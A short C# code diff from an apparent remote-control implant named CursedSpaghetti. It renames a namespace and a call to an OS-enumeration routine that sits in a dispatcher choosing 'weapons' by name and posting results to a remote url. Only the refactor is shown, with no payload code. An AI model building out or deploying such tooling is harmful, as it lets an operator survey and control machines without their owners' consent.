@@ -4,9 +4,9 @@ using System.Net;
 using System.Text;
 using System.Text.RegularExpressions;
 using System.Runtime.InteropServices;
-using System.Management;
 using System.Drawing;
 using System.Windows.Forms;
+using Weapons;
 
 namespace CursedSpaghetti
 {
@@ -89,7 +89,7 @@ namespace CursedSpaghetti
             switch (weapon.ToLower())
             {
                 case "basicenum":
-                    Weapons.ListBasicOSInfo(url);
+                    Gatherer.ListBasicOSInfo(url);
                     break;
                 default:
                     Post(url, "#!#Weapon does not exist");
